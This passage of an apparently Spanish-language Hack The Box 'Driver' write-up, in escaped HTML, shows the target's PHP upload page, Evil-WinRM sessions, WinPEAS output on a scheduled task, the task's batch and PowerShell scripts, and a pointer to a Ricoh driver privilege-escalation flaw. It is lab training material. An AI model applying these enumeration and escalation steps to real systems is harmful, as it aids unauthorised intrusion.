        &lt;span class=&#34;nv&#34;&gt;$target_dir&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\\firmwares\\&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$target_dir&lt;/span&gt; . basename&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;move_uploaded_file&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: fw_up.php?msg=SUCCESS&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
          &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
            header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: fw_up.php?msg=ERR&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
      &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;?&amp;gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&amp;lt;br/&amp;gt;&amp;lt;p&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;nbsp&lt;span class=&#34;p&#34;&gt;;&amp;amp;&lt;/span&gt;nbsp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.
  &amp;lt;br/&amp;gt;&amp;lt;form &lt;span class=&#34;nv&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;enctype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;multipart/form-data&amp;#34;&lt;/span&gt;&amp;gt;
&amp;lt;br/&amp;gt;&amp;lt;center&amp;gt; &amp;lt;table&amp;gt;
  &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Printer Model:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;printers&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;printers&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB DesignJet&amp;#34;&lt;/span&gt;&amp;gt;HTB DesignJet&amp;lt;/option&amp;gt;
  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB Ecotank&amp;#34;&lt;/span&gt;&amp;gt;HTB Ecotank&amp;lt;/option&amp;gt;
  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB Laserjet Pro&amp;#34;&lt;/span&gt;&amp;gt;HTB Laserjet Pro&amp;lt;/option&amp;gt;
  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB Mono&amp;#34;&lt;/span&gt;&amp;gt;HTB Mono&amp;lt;/option&amp;gt;
&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Upload Firmware:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/td&amp;gt;
  &amp;lt;/tr&amp;gt;
  &amp;lt;tr&amp;gt;
    &amp;lt;td &lt;span class=&#34;nv&#34;&gt;colspan&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;input &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Submit&amp;#34;&lt;/span&gt;/&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/form&amp;gt;

&amp;lt;/body&amp;gt;
&amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer&amp;#34;&lt;/span&gt;&amp;gt;
  &amp;lt;p&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#169; 2021 Driver Inc&amp;lt;/p&amp;gt;&lt;/span&gt;
  &amp;lt;p&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mailto:support@driver.htb&amp;#34;&lt;/span&gt;&amp;gt;support@driver.htb&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;/html&amp;gt;
 &amp;lt;?php &lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        //Send headers to cause a browser to request
        //username and password from user
        header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WWW-Authenticate: &amp;#34;&lt;/span&gt; .
            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Basic realm=\&amp;#34;MFP Firmware Update Center\&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1.0 401 Unauthorized&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

        //Show failure text, which browsers usually
        //show only after several failed attempts
        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Invalid Credentials&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; ?&amp;gt;
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dicho directorio no contiene nada, quizas algun cronjob elimina cada cierto tiempo los archivos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt; dir -Force C:&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;irmwares&lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Ejecutamos &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&#34;&gt;WinPEAS&lt;/a&gt;, donde vemos una tarea programada al cual Tony tiene acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;√â√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç¬π Scheduled Applications --Non Microsoft--
√à Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DRIVER&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; VerifyFirmware: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ppdata&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ocal&lt;span class=&#34;se&#34;&gt;\j&lt;/span&gt;ob&lt;span class=&#34;se&#34;&gt;\j&lt;/span&gt;ob.bat
    Permissions file: tony &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;AllAccess&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Permissions folder&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DLL Hijacking&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: tony &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;AllAccess&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
    Trigger: At log on of DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que el script accede a la carpeta donde se encuentran los archivos subidos en el sitio web utilizando el Explorer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cat &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bat&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;@echo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;off&lt;/span&gt;

&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOOP&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SystemRoot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;explorer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\firmwares&amp;#34;&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;ping&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;127&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nul&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ep&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;

&lt;span class=&#34;nb&#34;&gt;DEL &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;firmwares&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\*&lt;/span&gt;

&lt;span class=&#34;nb&#34;&gt;cls
&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;GOTO&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOOP&lt;/span&gt;

&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EXIT&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cat &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;$folder&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[uri]&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\firmwares&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$w&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Application&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()){&lt;/span&gt; 
  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LocationUrl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-ieq&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AbsoluteUri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; 
    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Finalmente vemos en el historial de la consola una impresora que fue agregada utilizando powershell, dicha version de impresora puede ser explotada para &lt;a href=&#34;https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/&#34;&gt;Escalar Privilegios&lt;/a&gt;, sin embargo por alguna razon la &lt;a href=&#34;https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/#proof-of-concept-exploit&#34;&gt;explotaci√≥n&lt;/a&gt; no tuvo exito, a√∫n asi intentado con el &lt;a href=&#34;https://www.rapid7.com/blog/post/2020/02/14/metasploit-wrap-up-51/#ricohprivilegeescalation&#34;&gt;Modulo de Metasploit&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
